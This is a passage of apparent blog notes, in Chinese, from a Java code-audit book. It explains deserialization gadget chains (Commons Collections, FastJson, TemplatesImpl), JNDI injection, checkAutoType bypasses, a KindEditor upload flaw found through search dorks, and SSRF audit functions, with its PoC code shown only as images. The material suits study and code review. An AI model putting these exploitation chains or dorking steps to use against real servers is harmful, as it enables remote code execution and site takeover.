src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232041009.png" alt="image-20220423204158877"></p><p>JDK中的&#x3D;&#x3D;Throwable类&#x3D;&#x3D;通过实现Serializable接口来表明自身可被序列化，其中serialVersionUID作为版本号信息，若在不同系统中该属性值不相等，则无法进行反序列化。&#x3D;&#x3D;Transient关键字&#x3D;&#x3D;用于标记该属性不希望进行序列化。</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>Java反序列化通过ObjectInputStream 类的readObject()方法实现。在反序列化的过程中，一个字节流将按照&#x3D;&#x3D;二进制结构&#x3D;&#x3D;被序列化成一个对象。当开发者&#x3D;&#x3D;重写&#x3D;&#x3D;readObject方法或readExternal方法时，其中如果隐藏有一些危险的操作且未对正在进行序列化的字节流进行充分的检测时，则会成为反序列化漏洞的触发点。</p><h3 id="5-8-3-漏洞产生的必要条件"><a href="#5-8-3-漏洞产生的必要条件" class="headerlink" title="5.8.3　漏洞产生的必要条件"></a>5.8.3　漏洞产生的必要条件</h3><h4 id="1．程序中存在一条可以产生安全问题的利用链，如远程代码执行"><a href="#1．程序中存在一条可以产生安全问题的利用链，如远程代码执行" class="headerlink" title="1．程序中存在一条可以产生安全问题的利用链，如远程代码执行"></a>1．程序中存在一条可以产生安全问题的利用链，如远程代码执行</h4><p>在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget &#x3D;&#x3D;chain&#x3D;&#x3D;，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。如下所示是CVE-2015-4582的利用链。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241155463.png" alt="image-20220424115510058"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241156081.png" alt="image-20220424115622992"></p><h4 id="2．触发点"><a href="#2．触发点" class="headerlink" title="2．触发点"></a>2．触发点</h4><p>反序列化过程是一个正常的业务需求，将正常的字节流还原成对象属于正常的功能。但是当程序中的某处触发点在还原对象的过程中，能够成功地执行构造出来的利用链，则会成为反序列化漏洞的触发点。</p><p>反序列化的漏洞形成需要上述条件全部得到满足，程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。</p><h3 id="5-8-4-反序列化拓展"><a href="#5-8-4-反序列化拓展" class="headerlink" title="5.8.4　反序列化拓展"></a>5.8.4　反序列化拓展</h3><h4 id="1．RMI"><a href="#1．RMI" class="headerlink" title="1．RMI"></a>1．RMI</h4><p>Java RMI（Java Remote Method Invocation，Java远程方法调用）是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。这两个虚拟机可以运行在相同计算机上的不同进程中，也可以运行在网络上的不同计算机中。</p><p>在网络传输的过程中，RMI中的对象是通过序列化方式进行编码传输的。这意味着，RMI在接收到经过序列化编码的对象后会进行反序列化。因此，可以通过RMI服务作为反序列化利用链的触发点。PoC的执行结果如图5-157所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241318590.png" alt="image-20220424131857403"></p><p>图5-157　PoC的执行结果</p><h4 id="2．JNDI"><a href="#2．JNDI" class="headerlink" title="2．JNDI"></a>2．JNDI</h4><p>JNDI（Java Naming and Directory Interface，Jave命令和目录接口）是一组应用程序接口，目的是方便查找远程或是本地对象。JNDI典型的应用场景是配置数据源，除此之外，JNDI还可以访问现有的目录和服务，例如LDAP、RMI、CORBA、DNS、NDS、NIS，如图5-158所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241321085.png" alt="image-20220424132103927"></p><p>图5-158　JNDI的应用场景</p><p>在程序通过JNDI获取外部远程对象过程中，程序被控制访问恶意的服务地址（例如指向恶意的RMI服务地址），并加载和实例化恶意对象时，将会造成JNDI注入。</p><p>JNDI注入利用过程如下。</p><p>当客户端程序中调用了InitialContext.lookup(url)，且url可被输入控制，指向精心构造好的RMI服务地址。</p><p>恶意的RMI服务会向受攻击的客户端返回一个Reference，用于获取恶意的Factory类</p><p>当客户端执行lookup()时，会对恶意的Factory类进行加载并实例化，通过factory.getObjectInstance()获取外部远程对象实例。</p><p>攻击者在&#x3D;&#x3D;Factory类&#x3D;&#x3D;文件的&#x3D;&#x3D;构造方法、静态代码块、getObjectInstance()&#x3D;&#x3D;方法等处写入恶意代码，达到远程代码执行的效果。</p><p>如图5-159所示，右边的恶意RMI服务收到来自客户端的请求，返回Reference给客户端，然后客户端再去恶意服务器上请求加载类。由于恶意代码写在静态代码块中，因此恶意代码在类加载初始化的过程中得以执行，如图5-160所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241329545.png" alt="image-20220424132954293"></p><p>图5-159　JNDI注入成功弹出计算器<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241330743.png" alt="image-20220424133018587"></p><p>图5-160　恶意代码写在静态代码块中</p><p>JEP290。JEP290是官方发布的用于缓解反序列化漏洞的措施，从8u121、7u13、6u141版本开始，JDK为RMI注册表和RMI分布式垃圾收集器内置了过滤器，只允许特定的类进行反序列化。此时，Registry无法成功攻击RMI，从错误信息可以看出过滤器拒绝了反序列化，如图5-161所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241332414.png" alt="image-20220424133200185"></p><p>图5-161　过滤器拒绝了反序列化</p><h3 id="5-8-5-Apache-Commons-Collections反序列化漏洞"><a href="#5-8-5-Apache-Commons-Collections反序列化漏洞" class="headerlink" title="5.8.5　Apache Commons Collections反序列化漏洞"></a>5.8.5　Apache Commons Collections反序列化漏洞</h3><p>2015年，FoxGlove Security 安全团队介绍了Java反序列化以及构造基于Apache Commons Collections 3.1版本的利用链攻击了当时最新版的WebLogic、JBoss等知名Java应用。虽然该利用链衍生出多个版本的利用方式，但其核心部分是相同的，不同之处在于中间过程的构造。</p><h4 id="1．反序列化漏洞原理"><a href="#1．反序列化漏洞原理" class="headerlink" title="1．反序列化漏洞原理"></a>1．反序列化漏洞原理</h4><p>在org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;InvokerTransformer#transform中存在一段利用反射技术执行任意Java代码的代码，如下所示，当input变量可控时，可以通过反射执行任意类的任意方法。transform方法的关键代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241346749.png" alt="image-20220424134605642"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241346818.png" alt="image-20220424134621727"></p><p>例如，当input为Runtime的对象时，则可以执行任意系统命令。但由于Runtime类并未实现Serializable接口，因此Runtime对象不可被序列化，所以在反序列化的利用场景中无法直接控制input为Runtime对象。</p><p>在org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;ChainedTransformer#transform中，通过遍历this.iTransformers来调用数组中每一个对象的transform方法。结合上面的代码，可以构造出链式调用Runtime.getRuntime().exec(“calc”)，此时便成功向系统注入了一个Runtime对象，完成了任意代码执行，这便是Commons Collection反序列化漏洞的核心。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241351083.png" alt="image-20220424135142984"></p><p>利用ChainedTransformer执行系统命令PoC的源码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241353024.png" alt="image-20220424135315914"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241353104.png" alt="image-20220424135335991"></p><p>该PoC的执行结果如图5-162所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241404806.png" alt="image-20220424140456558"></p><p>图5-162　PoC的执行结果</p><p>有了能够执行任意代码的利用点，还需要一个反序列化的触发点，也就是调用某个类的readObject方法。当某个类的readObject方法可以通过一定的代码逻辑到达漏洞的利用点时，就可以利用它进行漏洞的触发。根据readObjet所属类的不同和中间逻辑代码的不同，Commons Collection3.1版本反序列化漏洞存在若干版本的利用链。Ysoserial反序列化利用工具中提供了几种利用方式。</p><p>CommonsCollections1的利用链如下。通过AnnotationInvocationHandler类的readObject()方法作为触发点，此利用链利用动态代理会执行invoke的特性将代码逻辑控制执行到LazyMap.get()方法，又由于LazyMap.get()方法会调用ChainedTrans former.transform()方法，从而到达任意代码执行的漏洞点。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241431311.png" alt="image-20220424143124203"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241431012.png" alt="image-20220424143141229"></p><p>CommonsCollections6的利用链如下。显而易见，其利用的是HashSet的readObject()方法。由于HashSet在反序列化插入对象的过程中是根据hashcode进行排序，所以会调用hash方法，逐步调用后则会进入漏洞的利用点。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241439417.png" alt="image-20220424143951296"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241440499.png" alt="image-20220424144010399"></p><p>在Ysoserial反序列化利用工具中，构造CommonsCollections6利用链PoC的过程中有一个小细节，即不能直接使用map.add(entry)将带有payload的entry加入map对象内部。各位读者可自行动手调试和理解，相关源代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241444619.png" alt="image-20220424144416512"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241444658.png" alt="image-20220424144427550"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241444043.png" alt="image-20220424144440921"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241444495.png" alt="image-20220424144451387"></p><h4 id="2．TemplatesImpl类的利用"><a href="#2．TemplatesImpl类的利用" class="headerlink" title="2．TemplatesImpl类的利用"></a>2．TemplatesImpl类的利用</h4><p>Ysoserial反序列化利用工具中的CommonsCollections 4.0利用链是针对CommonsCollection 4.0版本的利用构造。与前面提到的利用方式的区别在于，CommonsCollections 4.0利用了TemplatesImpl类来执行任意代码。Ysoserial使用如下代码创建一个Template对象。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241616241.png" alt="image-20220424161642881"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241617606.png" alt="image-20220424161725335"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241618312.png" alt="image-20220424161812202"></p><p>利用TemplatesImpl类的大概流程是创建一个TemplatesImpl对象，再使用Javassist动态编程创建一个恶意类。由于这个恶意类是自定义的，因此可以通过该类执行任何想要执行的代码，比如Runtime.getRuntime().exec(“whoami”)。一个类在初始化时会自动执行静态代码块里的代码，因此可以将Runtime.getRuntime(). exec(“whoami”)写在恶意类的静态代码块中，在初始化的过程中自动执行。恶意类会被转化成一个byte数组，并传递给TemplatesImpl的_bytecodes属性。</p><p>在TemplateImpl类中，会循环遍历_bytecodes数组来加载并初始化所保存的类，关键语句为“_class[i] &#x3D; loader.defineClass(_bytecodes[i]);”。也就是说，TemplateImpl类在满足特定条件的情况下会对传入的恶意类进行加载，而在加载的过程中会执行静态代码块中的代码，造成任意代码执行。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241623450.png" alt="image-20220424162330997"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241623763.png" alt="image-20220424162359651"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241624288.png" alt="image-20220424162427168"></p><p>如下是CommonsCollections 4.0的利用链，读者可以根据利用链进行PoC的构造以及调试，分析TemplateImpl需要满足什么样的特定条件，才能对承载在_bytecodes的恶意类进行加载。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204241630393.png" alt="image-20220424163045287"></p><h3 id="5-8-6-FastJson反序列化漏洞"><a href="#5-8-6-FastJson反序列化漏洞" class="headerlink" title="5.8.6　FastJson反序列化漏洞"></a>5.8.6　FastJson反序列化漏洞</h3><p>与原生的Java反序列化的区别在于，FastJson反序列化并未使用readObject方法，而是由FastJson自定一套反序列化的过程。通过在反序列化的过程中自动调用类属性的setter方法和getter方法，将JSON字符串还原成对象，当这些自动调用的方法中存在可利用的潜在危险代码时，漏洞便产生了。</p><h4 id="1．FastJson反序列化漏洞的演变历程"><a href="#1．FastJson反序列化漏洞的演变历程" class="headerlink" title="1．FastJson反序列化漏洞的演变历程"></a>1．FastJson反序列化漏洞的演变历程</h4><p>与原生的Java反序列化的区别在于，FastJson反序列化并未使用readObject方法，而是由FastJson自定一套反序列化的过程。通过在反序列化的过程中自动调用类属性的setter方法和getter方法，将JSON字符串还原成对象，当这些自动调用的方法中存在可利用的潜在危险代码时，漏洞便产生了。</p><h3 id="1．FastJson反序列化漏洞的演变历程-1"><a href="#1．FastJson反序列化漏洞的演变历程-1" class="headerlink" title="1．FastJson反序列化漏洞的演变历程"></a>1．FastJson反序列化漏洞的演变历程</h3><p>FastJson反序列化漏洞的演变历程如图5-163所示。</p><p>图5-163　FastJson反序列化漏洞的演变历程</p><p>自从2017年爆出FastJson 1.2.24版本反序列化漏洞后，近几年安全人员在不断寻找新的利用方式。自FastJson 1.2.25版本开始，FastJson关闭了默认开启的AutoType，并且内置了一个黑名单，用于防止存在风险的类进行序列化。由于FastJson 1.2.41版本和1.2.42版本对类名处理不当，导致黑名单机制被绕过，在修复该漏洞的同时还将黑名单进行加密，增加了研究成本。在FastJson 1.2.45版本中，研究人员发现新的可利用的类，且不在黑名单中。在FastJson 1.2.47版本中，研究人员发现通过缓存机制，能够绕过AutoType的限制和黑名单机制。在2020年，FastJson 1.2.68版本又被发现新的绕过AutoType的方式，也是通过缓存的方式绕过，但具体成因的代码逻辑有些差异，利用难度也较先前版本更大。</p><p>从上述FastJson反序列化漏洞的演化历程可以看出，针对FastJson的漏洞挖掘主要在于以下两个方面。</p><p>寻找新的利用链，绕过黑名单。</p><p>寻找绕过AutoType的方式。　　</p><h4 id="2．FastJson反序列化的基础"><a href="#2．FastJson反序列化的基础" class="headerlink" title="2．FastJson反序列化的基础"></a>2．FastJson反序列化的基础</h4><p>FastJson将JSON还原成对象的方法有以下3种。</p><p>parseObject(String text)。</p><p>parseObject(String text, Class\ clazz)。</p><p>当通过这3种方法将JSON还原成对象时，FastJson自动调用类中的setter方法和无参构造函数，以及满足条件的getter方法。当类中定义的属性和方法满足下列要求时，FastJson会自动调用getter方法。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">只存在getter方法，无setter方法。<br>方法名称长度大于等于<span class="hljs-number">4</span>。<br>非静态方法。<br>方法名以<span class="hljs-meta">get</span>开头，且第四个字符为大写字母，例如getAge。<br>方法无须入参。<br>方法返回值继承自Collection、<span class="hljs-meta">Map</span>、AtomicBoolean、AtomicInteger和AtomicLong的其中一个。<br></code></pre></td></tr></table></figure><p>PoC如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242005894.png" alt="image-20220424200558765"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242006601.png" alt="image-20220424200617485"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242006852.png" alt="image-20220424200629720"></p><p>PoC的执行结果如图5-164所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242008207.png" alt="image-20220424200855050"></p><p>图5-164　PoC的执行结果</p><p>parseObject（String text）方法将JSON串还原成对象后，会再调用一个xxx方法，所以类中所有的getter方法都会被执行，如图5-165所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242009706.png" alt="image-20220424200926113"></p><p>图5-165　所有的getter方法都被执行</p><h4 id="3．checkAutoType安全机制"><a href="#3．checkAutoType安全机制" class="headerlink" title="3．checkAutoType安全机制"></a>3．checkAutoType安全机制</h4><p>FastJson 1.2.25版本中引入了checkAutotype，其中增加了黑白名单的校验，用于缓解反序列化漏洞的产生，并且将内置的黑白名单进行加密，增加了绕过黑白名单的研究成本。经过加密的部分白名单如图5-166所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242011676.png" alt="image-20220424201122545"></p><p>图5-166　经过加密的部分白名单</p><p>经过加密的部分黑名单如图5-167所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242011943.png" alt="image-20220424201141811"></p><p>图5-167　经过加密的部分黑名单</p><p>通常，以下几种类型的类可以通过校验。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elm">缓存 mapping 中的类。<br>白名单中的类。<br>开启 auto<span class="hljs-keyword">type</span>的类。<br>指定的期望类（expectClass）。<br>使用<span class="hljs-type">JSONType</span> 注解的类。<br></code></pre></td></tr></table></figure><p>FastJson优先从mapping中获取类，当成功获取时，其不会进行黑白名单的安全检测，因此可以通过寻找将类加入缓存的方法，达到从逻辑层面上绕过checkAutoType检测的目的。所以绕过checkAutoType安全机制是一种逻辑漏洞。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242023341.png" alt="image-20220424202308213"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242023460.png" alt="image-20220424202350354"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242024022.png" alt="image-20220424202401916"></p><p>FastJson 1.2.47版本的绕过方式主要是利用FastJson默认开启缓存，会将某些满足条件的类缓存至mapping中。通过该逻辑漏洞，原本被加入黑名单的类，又可以被继续利用。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242027059.png" alt="image-20220424202753943"></p><p>FastJson 1.2.68版本的绕过方式主要利用了指定期望类，并将某些满足条件的类缓存至mapping中。这个逻辑漏洞绕过了checkAutoType对任意类实例化的限制，可以对一些特殊类进行实例化，但并没有绕过黑名单，<em>因此需要重新寻找可利用的地方</em>。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242149355.png" alt="image-20220424214946256"></p><h4 id="4．FastJson反序列化漏洞实例"><a href="#4．FastJson反序列化漏洞实例" class="headerlink" title="4．FastJson反序列化漏洞实例"></a>4．FastJson反序列化漏洞实例</h4><h5 id="1）TemplatesImpl-类的利用。"><a href="#1）TemplatesImpl-类的利用。" class="headerlink" title="1）TemplatesImpl 类的利用。"></a>1）TemplatesImpl 类的利用。</h5><p>1.2.24版本的FastJson反序列化漏洞利用了TemplatesImpl类进行任意代码执行。在介绍Apache CC反序列化时，曾介绍过TemplatesImpl中的_bytecodes可以承载自定义的恶意类字节码。在TemplatesImpl实例化的过程中，会将_bytecodes所承载的字节码进行加载，从而造成任意代码执行。</p><p>对FastJson的利用也是同样的原理，但细节处略有不同。FastJson会自动调用符合条件的getter方法和setter方法，所以反序列化过程中会调用TemplatesImpl的getOutputProperties()方法，此时则会进入实例化TemplatesImpl的流程，通过_bytecodes加载恶意类的流程与ApcacheCommons Collections反序列化利用链相同。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242152839.png" alt="image-20220424215238738"></p><p>如前所述，在getter方法的调用规则中，TemplatesImpl中getOutputProperties()方法对应的属性是getOutputProperties，但此处_getOutputProperties多了一个下画线，却仍可以调用，这是因为FastJson具有智能匹配的功能。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242154665.png" alt="image-20220424215441566"></p><p>_bytecodes所承载的字节码需要进行Base64编码，在反序列化的过程中会对字节类型的属性进行Base64解码。</p><p>因为_tfactory需要一个对象，所以PoC中可写成”‘_tfactory’:{ }形式，表明它是一个对象，会调用_tfactory的构造函数并实例化出一个对象。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242159673.png" alt="image-20220424215949572"></p><p>根据解析流程的细节可以构造出如下PoC。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242201954.png" alt="image-20220424220158833"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242202478.png" alt="image-20220424220214369"></p><p>由于利用到的属性含有Private类型，因此该利用链的触发条件需要程序调用ParseObject()方法，并传入Feature.SupportNonPublicField用于支持Private类型属性的还原，如图5-168所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242203165.png" alt="image-20220424220316437"></p><p>图5-168　Private类型属性的还原</p><h5 id="（2）JNDI的利用。"><a href="#（2）JNDI的利用。" class="headerlink" title="（2）JNDI的利用。"></a>（2）JNDI的利用。</h5><p>TemplatesImpl的利用方式具有很大的局限性，大多数利用链的挖掘思路是寻找一个可以进行JNDI的setter方法。例如com.sun.rowset.JdbcRowSetImpl。</p><p>PoC如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242207018.png" alt="image-20220424220707924"></p><p>根据PoC以及前面介绍的setter方法的调用规则，可调用JdbcRowSetImpl的setDataSourceName()方法和setAutoCommit()方法。源码中对两个方法的实现如下，其中setAutoCommit()方法在判断this.conn不为空时会执行该类的connect()方法。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242209098.png" alt="image-20220424220957001"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242210807.png" alt="image-20220424221008714"></p><p>可以发现，connect()方法中调用了lookup()方法，且参数来源于DataSourceName属性，这个参数可通过setDataSourceName()方法进行控制。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242212890.png" alt="image-20220424221230776"></p><p>因此，此时可以利用JNDI注入的方式完成攻击，如图5-169所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204242213091.png" alt="image-20220424221258484"></p><p>图5-169　利用JNDI注入的方式完成攻击</p><h2 id="5-9-使用含有已知漏洞的组件"><a href="#5-9-使用含有已知漏洞的组件" class="headerlink" title="5.9　使用含有已知漏洞的组件"></a>5.9　使用含有已知漏洞的组件</h2><h3 id="5-9-1-组件漏洞简介"><a href="#5-9-1-组件漏洞简介" class="headerlink" title="5.9.1　组件漏洞简介"></a>5.9.1　组件漏洞简介</h3><p>“工欲善其事，必先利其器”。为了提高开发效率，许多开发人员会在应用系统中选用一些开发框架或者第三方组件。然而，这些组件在带来便利的同时，也可能为应用系统造成安全隐患，仿佛“隐形炸弹”。因此，我们应该对应用系统使用的第三方组件予以重视。</p><p>相信关注漏洞资讯的读者朋友们会留意到第三方组件的公开漏洞频频出现。那么这些漏洞资讯的关键信息包括哪些呢？我们可通过在CNVD平台报送原创漏洞的网页截图进行了解，如图5-170所示，漏洞厂商、影响对象类型、影响产品、影响产品版本、漏洞类型等字段是必填项，我们可以将它们视为漏洞的关键信息。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251518261.png" alt="image-20220425151854143"></p><p>图5-170　CNVD平台报送原创漏洞网页截图</p><p>我们可以借助图5-171所示的步骤判断某第三方组件是否受到已知漏洞的影响：首先查看第三方组件的版本号，然后根据资料判断该版本是否受到已知漏洞的影响。若确认该版本受到已知漏洞的影响，则进行漏洞处置（比如升级版本或进行安全配置）。若确认该版本不会受到已知漏洞的影响，则不进行漏洞处置。</p><p>一个有趣的现象是：有些安全研究人员会对开源应用的补丁进行比对，进而推断漏洞出处。“推出补丁却反而暴露出漏洞”成为“开源应用之殇”。</p><p>值得注意的是，由于漏洞信息碎片化，影响程度不一的新漏洞频现，所以由普通用户对中间件漏洞进行全面审计并不容易。面对这个问题，大型厂商会在其进行代码扫描时支持对第三方组件的扫描与检测（漏洞库实时更新），有些安全厂商也在其安全产品中采集第三方组件的信息，以期在事前找到风险点。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251520219.png" alt="image-20220425152029120"></p><p>图5-171　通过版本比对判断某第三方组件是否受到已知漏洞影响的流程图</p><h3 id="5-9-2-Weblogic中组件的漏洞"><a href="#5-9-2-Weblogic中组件的漏洞" class="headerlink" title="5.9.2　Weblogic中组件的漏洞"></a>5.9.2　Weblogic中组件的漏洞</h3><p>Weblogic作为一款庞大的Java项目，不可避免地会将一些可复用的功能封装成Jar包或者引入一些第三方Jar包，如图5-172所示。Weblogic反序列化漏洞一直层出不穷，原因之一就是庞大的项目中有大量的类库可供安全研究者进行漏洞挖掘。本节将对Weblogic的几个漏洞进行简单回顾。</p><p>2015年，Apache Commons Collections 3.1组件的反序列化漏洞被公布于世。由于Weblogic 10.3.6.0.0版本引入了该版本的Jar包，利用Weblogic的T3协议，可以对Weblogic进行反序列化远程代码执行。</p><p>XMLDecoder是JDK中用于解析XML的类，该类存在反序列化远程代码执行的问题（CVE-2017-10271），凡是使用了XMLDecoder的程序，未事先做好输入的过滤就会受到该漏洞的影响。Weblogic的WLSSecurity组件对外提供Webservice服务,其中使用了XMLDecoder来解析用户传入的XML数据。因此10.3.6.0.0、12.1.3.0.0等几个版本存在XMLDecoder反序列化远程代码执行漏洞。</p><p>2020年1月，Oracle Coherence组件反序列化远程代码执行漏洞（CVE-2020- 2555）被曝光，其原理与Apache Commons Collections 3.1类似。该组件在WebLogic 12c及以上版本中默认集成到Weblogic安装包中，因此Weblogic会受到CVE-2020-2555的影响。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251527052.png" alt="image-20220425152738904"></p><p>图5-172　Weblogic项目</p><h3 id="5-9-3-富文本编辑器漏洞"><a href="#5-9-3-富文本编辑器漏洞" class="headerlink" title="5.9.3　富文本编辑器漏洞"></a>5.9.3　富文本编辑器漏洞</h3><p>在实际的项目开发中，可能会引入第三方编辑器插件，例如UEditor、KindEditor和FCKeditor等插件。开发者在引入第三方插件时，大多数情况下并不会修改插件的目录结构，所以目录结构相对固定，通过扫描器可以很容易地探测出使用的插件类型与版本。并且为了方便演示插件的用法，多数插件会内置一个Demo页面，用于演示编辑器的基本功能。当开发者在引用第三方编辑器插件时，如果未删除Demo页面或未对插件目录访问加以限制时，便可能存在安全隐患。</p><p>通过百度或者Google的搜索语法搜索插件固定的路径，比如FCKeditor插件的路径为“FCKeditor&#x2F;editor&#x2F;fckeditor.html”，则可以找到使用该插件的网站，并且可以使用插件进行文件上传等操作，如图5-173所示。</p><p>我曾在响应某网站安全事件时发现攻击者通过KindEditor这一开源的在线HTML编辑器的文件上传漏洞实现站点劫持，将站点跳转到违法网站。经过分析，攻击者是对历史漏洞CVE-2017-1002024进行了利用，受影响的版本是4.1.11及之前的版本。攻击者可以利用该漏洞将htm、html、txt等文件上传到服务器上。下面对这个漏洞进行介绍，以提醒读者朋友们注意第三方组件的安全问题。</p><p>KindEditor存在一个自带的Demo页面（路径为“kindeditor-4.1.11&#x2F;jsp&#x2F;demo.jsp”），用于演示KindEditor的基本功能。后台对上传功能的具体处理在upload_json.jsp中，对upload_json.jsp的功能代码进行审计，我们会发现上传功能对上传文件的后缀名采用白名单的方式进行限制，如图5-174所示。此时无法上传JSP文件进行代码执行，但仍然可以上传html文件进行重定向、XSS攻击等操作，如图5-175和图5-176所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251533009.png" alt="image-20220425153357899"></p><p>图5-173　使用FCKeditor的网站<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251534582.png" alt="image-20220425153449452"></p><p>图5-174　upload_json.jsp默认允许上传htm、html、txt等类型文件<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251535362.png" alt="image-20220425153554238"></p><p>图5-175　通过文本编辑器上传html文件</p><p>更多内容看书吧</p><h2 id="第6章-“OWASP-Top-10-2017”之外常见漏洞的代码审计"><a href="#第6章-“OWASP-Top-10-2017”之外常见漏洞的代码审计" class="headerlink" title="第6章　“OWASP Top 10 2017”之外常见漏洞的代码审计"></a>第6章　“OWASP Top 10 2017”之外常见漏洞的代码审计</h2><h3 id="6-2-2-ssrf实际案例及修复方式"><a href="#6-2-2-ssrf实际案例及修复方式" class="headerlink" title="6.2.2　ssrf实际案例及修复方式"></a>6.2.2　ssrf实际案例及修复方式</h3><p>利用SSRF漏洞能实现的事情有很多，包括但不局限于：扫描内网、向内部任意主机的任意端口发送精心构造的攻击载荷请求、攻击内网的 Web应用、读取文件以及拒绝服务攻击等。需要注意的是，Java 中的 SSRF利用是有局限性的，在实际场景中，一般利用http&#x2F;https协议来探测端口、暴力穷举等，还可以利用file协议读取&#x2F;下载任意文件。</p><p>SSRF 漏洞出现的场景有很多，如在线翻译、转码服务、图片收藏&#x2F;下载、信息采集、邮件系统或者从远程服务器请求资源等。通常我们可以通过浏览器查看源代码查找是否在本地进行了请求，也可以使用 DNSLog等工具进行测试网页是否被访问。但对于代码审计人员来说，通常可以从一些 http 请求函数入手，表6-1中是在审计 SSRF 漏洞时需要关注的一些敏感函数。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251608625.png" alt="image-20220425160846504"></p><p>表6-1　审计 SSRF 时需要注意的敏感函数</p><p>除表6-1中列举的部分敏感函数外，还有很多需要关注的类，如HttpClient类、URL 类等。根据实际场景的不同，这些类中的一些方法同样可能存在着 SSRF 漏洞。此外，还有一些封装后的类同样需要留意，如封装HttpClient后的 Request 